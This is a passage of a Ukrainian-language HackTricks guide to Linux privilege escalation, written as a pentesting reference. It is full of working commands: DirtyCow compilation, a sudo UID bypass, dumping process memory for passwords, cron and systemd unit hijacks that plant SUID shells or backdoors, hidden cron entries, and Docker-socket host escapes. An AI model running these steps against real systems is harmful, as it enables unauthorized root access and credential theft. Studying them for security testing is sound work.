# Підвищення привілеїв в Linux

{% hint style="success" %}
Вивчайте та практикуйте хакінг AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Навчання HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте хакінг GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Навчання HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}

## Інформація про систему

### Інформація про ОС

Давайте почнемо здобувати деякі знання про ОС, яка працює.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Шлях

Якщо у вас **є права на запис у будь-якій папці всередині змінної `PATH`**, ви можете захопити деякі бібліотеки або виконуючі файли:
```bash
echo $PATH
```
### Інформація про середовище

Цікава інформація, паролі або ключі API в змінних середовища?
```bash
(env || set) 2>/dev/null
```
### Вразливості ядра

Перевірте версію ядра та наявність вразливостей, які можна використати для підвищення привілеїв
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Можна знайти хороший список вразливих ядер та деякі вже **скомпільовані експлойти** тут: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) та [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Інші сайти, де можна знайти деякі **скомпільовані експлойти**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Для вилучення всіх вразливих версій ядра з цього веб-сайту можна виконати:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Інструменти, які можуть допомогти у пошуку експлойтів ядра:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (виконується на жертві, перевіряє експлойти лише для ядра 2.x)

Завжди **шукайте версію ядра в Google**, можливо, ваша версія ядра написана в якомусь експлойті, тоді ви будете впевнені, що цей експлойт є дійсним.

### CVE-2016-5195 (DirtyCow)

Підвищення привілеїв в Linux - Ядро Linux <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Версія Sudo

На основі вразливих версій sudo, які зустрічаються в:
```bash
searchsploit sudo
```
Ви можете перевірити, чи є версія sudo вразливою за допомогою цієї команди grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Від @sickrov
```
sudo -u#-1 /bin/bash
```
### Перевірка підпису Dmesg не вдалася

Перевірте **smasher2 box of HTB** для **прикладу**, як цю уразу можна використати
```bash
dmesg 2>/dev/null | grep "signature"
```
### Додаткова системна енумерація
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Вибір можливих захистів

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Втеча з Docker

Якщо ви знаходитесь всередині контейнера Docker, ви можете спробувати втекти з нього:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Диски

Перевірте **що змонтовано і незмонтовано**, де і чому. Якщо щось незмонтовано, ви можете спробувати змонтувати його і перевірити приватну інформацію.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Корисне програмне забезпечення

Перерахуйте корисні виконувані файли
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Також перевірте, чи **встановлено будь-який компілятор**. Це корисно, якщо вам потрібно використовувати який-небудь експлойт ядра, оскільки рекомендується компілювати його на машині, де ви збираєтеся використовувати його (або на подібній).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Вразливе програмне забезпечення, встановлене

Перевірте **версію встановлених пакетів та служб**. Можливо, є якась стара версія Nagios (наприклад), яку можна використати для підвищення привілеїв...\
Рекомендується перевірити вручну версію найбільш підозрілого встановленого програмного забезпечення.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Якщо у вас є доступ до машини через SSH, ви також можете використовувати **openVAS** для перевірки застарілих та вразливих програм, встановлених усередині машини.

{% hint style="info" %}
_Зверніть увагу, що ці команди покажуть багато інформації, яка в основному буде некорисною, тому рекомендується використовувати додатки, такі як OpenVAS або подібні, які перевірять, чи є яка-небудь встановлена версія програмного забезпечення вразливою до відомих експлойтів_
{% endhint %}

## Процеси

Подивіться, **які процеси** виконуються та перевірте, чи який-небудь процес має **більше привілеїв, ніж повинен** (можливо, tomcat виконується від імені root?)
```bash
ps aux
ps -ef
top -n 1
```
Завжди перевіряйте можливість запущених [**відладчиків electron/cef/chromium**, ви можете використати це для підвищення привілеїв](electron-cef-chromium-debugger-abuse.md). **Linpeas** виявляє їх, перевіряючи параметр `--inspect` у командному рядку процесу.\
Також **перевірте свої привілеї над бінарними файлами процесів**, можливо, ви зможете перезаписати когось.

### Моніторинг процесів

Ви можете використовувати інструменти, такі як [**pspy**](https://github.com/DominicBreuker/pspy) для моніторингу процесів. Це може бути дуже корисно для ідентифікації вразливих процесів, які виконуються часто або коли виконані певні вимоги.

### Пам'ять процесів

Деякі служби сервера зберігають **паролі у відкритому вигляді у пам'яті**.\
Зазвичай вам знадобиться **root-привілеї**, щоб прочитати пам'ять процесів, які належать іншим користувачам, тому це зазвичай корисно, коли ви вже маєте root-права і хочете дізнатися більше паролів.\
Однак пам'ятайте, що **як звичайний користувач ви можете читати пам'ять процесів, які вам належать**.

{% hint style="warning" %}
Зауважте, що в наш час більшість машин **не дозволяють ptrace за замовчуванням**, що означає, що ви не можете витягти інші процеси, які належать вашому непривілейованому користувачеві.

Файл _**/proc/sys/kernel/yama/ptrace\_scope**_ контролює доступність ptrace:

* **kernel.yama.ptrace\_scope = 0**: всі процеси можуть бути налагоджені, якщо вони мають той самий uid. Це класичний спосіб роботи ptrace.
* **kernel.yama.ptrace\_scope = 1**: можна налагоджувати лише батьківський процес.
* **kernel.yama.ptrace\_scope = 2**: Тільки адміністратор може використовувати ptrace, оскільки це потребує CAP\_SYS\_PTRACE.
* **kernel.yama.ptrace\_scope = 3**: Ніякі процеси не можуть бути відстежені за допомогою ptrace. Після встановлення потрібно перезавантаження для повторного ввімкнення відстеження.
{% endhint %}

#### GDB

Якщо у вас є доступ до пам'яті служби FTP (наприклад), ви можете отримати Heap та шукати в ньому паролі.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Сценарій GDB

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

Для заданого ідентифікатора процесу **maps показують, як пам'ять відображена в межах віртуального адресного простору цього процесу**; вони також показують **права доступу до кожного відображеного регіону**. Псевдофайл **mem викриває саму пам'ять процесів**. З файлу **maps ми знаємо, які області пам'яті доступні для читання** та їх зміщення. Ми використовуємо цю інформацію, щоб **перейти до файлу mem та вивантажити всі доступні для читання області** у файл.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` надає доступ до **фізичної** пам'яті системи, а не віртуальної пам'яті. Віртуальний простір адрес ядра можна отримати, використовуючи /dev/kmem.\
Зазвичай, `/dev/mem` може бути прочитаний тільки користувачем **root** та групою **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump для Linux

ProcDump - це переосмислення класичного інструменту ProcDump з набору інструментів Sysinternals для Windows. Отримайте його за посиланням [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Інструменти

Для виведення пам'яті процесу ви можете використовувати:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Ви можете вручну видалити вимоги root та вивести процес, який вам належить
* Скрипт A.5 з [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (потрібен root) 

### Облікові дані з пам'яті процесу

#### Приклад вручну

Якщо ви виявите, що процес аутентифікатора працює:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Ви можете витягти процес (див. попередні розділи, щоб знайти різні способи вилучення пам'яті процесу) та шукати облікові дані всередині пам'яті:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Інструмент [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) буде **викрадати облікові дані у вигляді чіткого тексту з пам'яті** та з деяких **відомих файлів**. Для правильної роботи він потребує привілеїв root.

| Особливість                                       | Назва процесу        |
| ------------------------------------------------- | -------------------- |
| Пароль GDM (Kali Desktop, Debian Desktop)         | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Активні FTP-з'єднання)                   | vsftpd               |
| Apache2 (Активні HTTP Basic Auth сесії)          | apache2              |
| OpenSSH (Активні SSH-сесії - Використання Sudo)  | sshd:                |

#### Пошук Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Заплановані/Cron завдання

Перевірте, чи є які-небудь заплановані завдання вразливими. Можливо, ви зможете скористатися скриптом, який виконується від імені root (вразливість у шаблонах? можна змінювати файли, які використовує root? використовувати символьні посилання? створювати конкретні файли в каталозі, який використовує root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Шлях Cron

Наприклад, всередині _/etc/crontab_ ви можете знайти ШЛЯХ: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Зверніть увагу, що користувач "user" має права на запис у /home/user_)

Якщо всередині цього crontab користувач root намагається виконати якусь команду або скрипт без встановлення шляху. Наприклад: _\* \* \* \* root overwrite.sh_\
Тоді ви можете отримати оболонку root, використовуючи:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron використання скрипта з метасимволом (Внедрення метасимволів)

Якщо скрипт виконується користувачем root і містить "**\***" всередині команди, ви можете скористатися цим для виконання неочікуваних дій (наприклад, підвищення привілеїв). Приклад:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Якщо метасимвол передує шляху, наприклад** _**/some/path/\***_, **то вразливість відсутня (навіть** _**./\***_ **не є вразливим).**

Для отримання додаткових прийомів експлуатації метасимволів перегляньте наступну сторінку:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Перезапис сценарію Cron та символічне посилання

Якщо **можна змінити сценарій Cron**, який виконується від імені root, можна дуже легко отримати оболонку:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Якщо сценарій, виконаний користувачем root, використовує **каталог, до якого у вас є повний доступ**, можливо, буде корисно видалити цей каталог і **створити символічний посилання на інший каталог**, в якому знаходиться сценарій, котрим ви керуєте
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Часті cron-завдання

Ви можете моніторити процеси, щоб шукати процеси, які виконуються кожну 1, 2 або 5 хвилин. Можливо, ви зможете скористатися цим і підвищити привілеї.

Наприклад, для **моніторингу кожні 0,1 секунди протягом 1 хвилини**, **сортування за менш виконуваними командами** та видалення команд, які були виконані найбільше, ви можете виконати:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ви також можете використовувати** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (це буде відстежувати та перераховувати кожен процес, який починається).

### Невидимі cron-завдання

Можливо створити cron-завдання, **додавши символ повернення каретки після коментаря** (без символу нового рядка), і це cron-завдання буде працювати. Приклад (зверніть увагу на символ повернення каретки):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Сервіси

### Файли _.service_, до яких можна записувати

Перевірте, чи можете ви записувати будь-який файл `.service`, якщо можете, ви **можете змінити його**, щоб він **виконував вашу** задню **дверку при** запуску, **перезапуску** або **зупинці** сервісу (можливо, вам доведеться зачекати, поки машина перезавантажиться).\
Наприклад, створіть свою задню дверку всередині файлу .service з **`ExecStart=/tmp/script.sh`**

### Виконувані сервісні бінарні файли

Пам'ятайте, що якщо у вас є **права на запис для бінарних файлів, які виконуються сервісами**, ви можете змінити їх на задні дверки, тому коли сервіси будуть перевиконані, задні дверки будуть виконані.

### systemd PATH - Відносні шляхи

Ви можете побачити шлях, який використовує **systemd**, за допомогою:
```bash
systemctl show-environment
```
Якщо ви виявите, що можете **записувати** в будь-якій з папок шляху, ви, можливо, зможете **підвищити привілеї**. Вам потрібно шукати файли конфігурації служб, де використовуються **відносні шляхи**.
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Потім створіть **виконуваний файл** з **такою ж назвою, як і відносний шлях бінарного файлу** всередині папки шляху systemd, де ви можете писати, і коли запитують сервіс виконати уразливу дію (**Start**, **Stop**, **Reload**), ваш **задній прохід буде виконаний** (непривілейовані користувачі зазвичай не можуть запускати/зупиняти сервіси, але перевірте, чи можете використовувати `sudo -l`).

**Дізнайтеся більше про сервіси за допомогою `man systemd.service`.**

## **Таймери**

**Таймери** - це файлы одиниць systemd, ім'я яких закінчується на `**.timer**`, які керують файлами або подіями `**.service**`. **Таймери** можуть бути використані як альтернатива cron, оскільки вони мають вбудовану підтримку подій календарного часу та монотонних подій та можуть бути запущені асинхронно.

Ви можете перелічити всі таймери за допомогою:
```bash
systemctl list-timers --all
```
### Записувані таймери

Якщо ви можете змінити таймер, ви можете зробити його виконати деякі існуючі одиниці systemd (наприклад, `.service` або `.target`)
```bash
Unit=backdoor.service
```
У документації ви можете прочитати, що таке Unit:

> Unit, який активується, коли таймер завершується. Аргумент - це ім'я unit, суфікс якого не є ".timer". Якщо не вказано, це значення за замовчуванням встановлюється на службу, яка має те саме ім'я, що й unit таймера, за винятком суфікса. (Див. вище.) Рекомендується, щоб ім'я unit, який активується, та ім'я unit таймера були ідентичними, за винятком суфікса.

Отже, для зловживання цим дозволом вам потрібно:

* Знайти деякий systemd unit (наприклад, `.service`), який **виконує записний бінарний файл**
* Знайти деякий systemd unit, який **виконується за допомогою відносного шляху**, і у вас є **права на запис** до **шляху systemd** (щоб видаляти цей виконавчий файл)

**Дізнайтеся більше про таймери за допомогою `man systemd.timer`.**

### **Увімкнення таймера**

Для увімкнення таймера вам потрібні права root і виконати:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Зауважте, що **таймер** **активується**, створивши символічне посилання на нього у `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Сокети

Сокети Unix Domain (UDS) дозволяють **комунікацію процесів** на одній або різних машинах у моделях клієнт-сервер. Вони використовують стандартні файлові дескриптори Unix для міжкомп'ютерної комунікації і налаштовуються через файли `.socket`.

Сокети можна налаштувати за допомогою файлів `.socket`.

**Дізнайтеся більше про сокети за допомогою `man systemd.socket`.** У цьому файлі можна налаштувати кілька цікавих параметрів:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ці параметри різняться, але узагальнення використовується для **вказівки, де буде прослуховуватися** сокет (шлях до файлу сокета AF\_UNIX, IPv4/6 та/або номер порту для прослуховування і т. д.)
* `Accept`: Приймає булеве значення. Якщо **true**, для кожного вхідного підключення створюється **екземпляр служби**, і лише сокет підключення передається йому. Якщо **false**, всі прослуховуючі сокети самі **передаються запущеній службі**, і лише один екземпляр служби створюється для всіх підключень. Це значення ігнорується для датаграмних сокетів та FIFO, де один службовий блок однозначно обробляє весь вхідний трафік. **За замовчуванням false**. З міркувань продуктивності рекомендується писати нові демони тільки так, щоб вони підходили для `Accept=no`.
* `ExecStartPre`, `ExecStartPost`: Приймає один або кілька рядків команд, які виконуються **перед тим, як** прослуховуючі **сокети**/FIFO **створюються** та зв'язуються відповідно. Перший токен рядка команди повинен бути абсолютним іменем файлу, за яким слідують аргументи для процесу.
* `ExecStopPre`, `ExecStopPost`: Додаткові **команди**, які виконуються **перед тим, як** прослуховуючі **сокети**/FIFO **закриваються** та видаляються відповідно.
* `Service`: Вказує ім'я **служби**, яку **активувати** при **вхідному трафіку**. Це налаштування дозволено лише для сокетів з Accept=no. За замовчуванням воно встановлюється на службу, яка має те саме ім'я, що й сокет (замінено суфіксом). У більшості випадків не повинно бути необхідності використовувати цей параметр.

### Записувані файли .socket

Якщо ви знайдете **записуваний** файл `.socket`, ви можете **додати** на початку розділу `[Socket]` щось на зразок: `ExecStartPre=/home/kali/sys/backdoor`, і backdoor буде виконано перед створенням сокета. Тому, ймовірно, вам **доведеться зачекати, поки машина перезавантажиться.**\
_Зауважте, що система повинна використовувати цю конфігурацію файлу сокета, інакше backdoor не буде виконано_

### Записувані сокети

Якщо ви **визначите будь-який записуваний сокет** (_зараз ми говоримо про Unix сокети, а не про файли конфігурації `.socket`_), то **ви можете спілкуватися** з цим сокетом і, можливо, використовувати уразливість.

### Перелік Unix сокетів
```bash
netstat -a -p --unix
```
### Сировинне з'єднання
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Приклад експлуатації:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP сокети

Зверніть увагу, що можуть існувати деякі **сокети, які слухають HTTP** запити (_Я не говорю про файли .socket, а про файли, які діють як unix сокети_). Ви можете перевірити це за допомогою:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Якщо **сокет відповідає на запит HTTP**, то ви можете **взаємодіяти** з ним і, можливо, **експлуатувати деякі вразливості**.

### Записний Docker Socket

Сокет Docker, який часто знаходиться за шляхом `/var/run/docker.sock`, є критичним файлом, який повинен бути захищений. За замовчуванням він доступний для запису користувачем `root` та членами групи `docker`. Володіння правами на запис до цього сокету може призвести до підвищення привілеїв. Ось розбір того, як це можна зробити, та альтернативні методи, якщо CLI Docker недоступний.

#### **Підвищення привілеїв за допомогою Docker CLI**

Якщо у вас є права на запис до сокету Docker, ви можете підвищити привілеї за допомогою наступних команд:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
### **Використання Docker API безпосередньо**

У випадках, коли Docker CLI недоступний, сокет Docker все ще можна маніпулювати за допомогою Docker API та команд `curl`.

1. **Перелік образів Docker:** Отримати список доступних образів.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2. **Створення контейнера:** Надіслати запит на створення контейнера, який монтує кореневий каталог системи хоста.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Запустіть новостворений контейнер:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3. **Приєднання до контейнера:** Використовуйте `socat`, щоб встановити з'єднання з контейнером, що дозволяє виконувати команди всередині нього.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Після налаштування з'єднання `socat` ви можете виконувати команди безпосередньо в контейнері з рівнем доступу root до файлової системи хоста.

### Інші

Зверніть увагу, що якщо у вас є права на запис до сокету Docker через **належність до групи `docker`**, у вас є [**більше способів підвищення привілеїв**](interesting-groups-linux-pe/#docker-group). Якщо [**API Docker прослуховує порт** ви також можете скомпрометувати його](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Перевірте **інші способи виходу з Docker або зловживання ним для підвищення привілеїв** в:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Підвищення привілеїв Containerd (ctr)

Якщо ви виявите, що можете використовувати команду **`ctr`**, прочитайте наступну сторінку, оскільки **ви можете зловживати нею для підвищення привілеїв**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## Підвищення привілеїв **RunC**

Якщо ви виявите, що можете використовувати команду **`runc`**, прочитайте наступну сторінку, оскільки **ви можете зловживати нею для підвищення привілеїв**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus - це складна **система міжпроцесного зв'язку (IPC)**, яка дозволяє програмам ефективно взаємодіяти та обмінюватися даними. Розроблена з урахуванням сучасної системи Linux, вона пропонує надійний фреймворк для різних форм взаємодії програм.

Система є універсальною, підтримуючи базовий IPC, який полегшує обмін даними між процесами, нагадуючи про покращені UNIX-сокети. Крім того, вона допомагає в трансляції подій або сигналів, сприяючи безшовній інтеграції між компонентами системи. Наприклад, сигнал від демона Bluetooth про вхідний дзвінок може викликати приглушення музичного програвача, покращуючи взаємодію з користувачем. Крім того, D-Bus підтримує віддалену систему об'єктів, спрощуючи запити служб та виклики методів між додатками, спрощуючи процеси, які традиційно були складними.

D-Bus працює за моделлю **дозволити/заборонити**, керуючи дозволами повідомлень (виклики методів, емісії сигналів і т. д.) на основі кумулятивного ефекту відповідності політичним правилам. Ці політики вказують взаємодії з автобусом, що потенційно дозволяє підвищення привілеїв через експлуатацію цих дозволів.

Наведено приклад такої політики в `/etc/dbus-1/system.d/wpa_supplicant.conf`, де детально описані дозволи для користувача root на володіння, відправлення та отримання повідомлень від `fi.w1.wpa_supplicant1`.

Політики без вказаного користувача або групи застосовуються універсально, тоді як політики контексту "default" застосовуються до всіх, кого не охоплюють інші конкретні політики.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Дізнайтеся, як перелічити та використовувати комунікацію D-Bus тут:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **Мережа**

Завжди цікаво перелічити мережу та визначити положення машини.

### Загальне перелічення
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Відкриті порти

Завжди перевіряйте мережеві служби, які працюють на машині, з якою ви не могли взаємодіяти до доступу до неї:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Прослуховування

Перевірте, чи можете ви перехоплювати трафік. Якщо можете, ви можете отримати деякі облікові дані.
```
timeout 1 tcpdump
```
## Користувачі

### Загальне перелічення

Перевірте **хто** ви є, які **привілеї** у вас є, які **користувачі** є в системах, які з них можуть **увійти** і які мають **root-привілеї:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
